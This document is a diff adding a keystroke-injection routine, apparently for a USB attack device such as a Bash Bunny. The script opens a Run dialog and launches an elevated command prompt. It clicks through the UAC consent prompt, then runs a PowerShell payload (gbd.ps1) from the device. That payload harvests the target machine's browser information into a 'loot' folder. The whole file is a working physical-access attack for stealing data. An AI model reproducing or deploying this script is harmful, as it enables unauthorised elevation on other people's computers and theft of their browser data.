@@ -1,0 +1,19 @@
+// Routine C: Inject powershell script
+
+K: GUI, R
+SLEEP 1
+
+// Gain root powershell
+S: powershell -Command "Start-Process cmd -Verb RunAs -ArgumentList '/k'"
+K: ENTER
+SLEEP 2
+
+// Bypass UAC
+K: LEFT_ARROW
+K: ENTER
+
+
+// S: powerShell -ExecutionPolicy Bypass ".((gwmi win32_volume -f 'label=''TARGET''').Name+'payloads\gbd.ps1')"
+S: "powershell \".((gwmi win32_volume -f 'label=''TARGET''').Name+'payloads\\gbd.ps1'); $bunny =(gwmi win32_volume -f 'label=''TARGET''' |  Select-Object -ExpandProperty DriveLetter); Get-BrowserInformation | Out-File -Append $bunny\loot\BrowserData\$env:computername.txt\""
+Q ENTER
+K: ENTER
